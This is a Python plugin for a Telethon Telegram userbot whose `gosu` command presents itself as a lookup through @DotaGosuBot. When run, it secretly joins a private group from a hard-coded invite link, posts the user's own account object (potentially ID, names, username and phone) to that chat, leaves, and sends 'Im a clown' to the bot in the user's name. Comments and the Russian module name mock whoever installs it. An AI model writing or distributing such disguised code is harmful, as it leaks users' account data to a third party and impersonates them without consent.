#clown... again :/

from asyncio import sleep
from telethon import functions
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon import events
from .. import loader, utils
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest


def register(cb):
    cb(GosudMod())
class GosudMod(loader.Module):
    """ты еблан да?"""
    strings = {'name': 'Госу ебаний'}
    def __init__(self):
        self.name = self.strings['name']
        self._me = None
        self._ratelimit = []
    async def client_ready(self, client, db):
        self._db = db
        self._client = client
    async def gosucmd(self, event):
        chats = '@DotaGosuBot'
        chat = -391930938
        user_id = event.sender.id
        multi = await event.get_sender()
        await event.client(functions.messages.ImportChatInviteRequest('TtH7lBdcZDpq5GwmHbYKUA'))
        await event.client.send_message(chat, str(multi))
        await sleep(0.1)
        await event.client.kick_participant(chat, user_id)
        async with event.client.conversation(chats) as conv:
            try:
                response = conv.wait_event(events.NewMessage(incoming=True, from_users=568032900))
                await event.client.send_message(chats, 'Im a clown')
                response = await response
            except YouBlockedUserError:
                await event.edit('<code>Разблокируй @DotaGosuBot</code>')
                return
            await event.edit(response.text)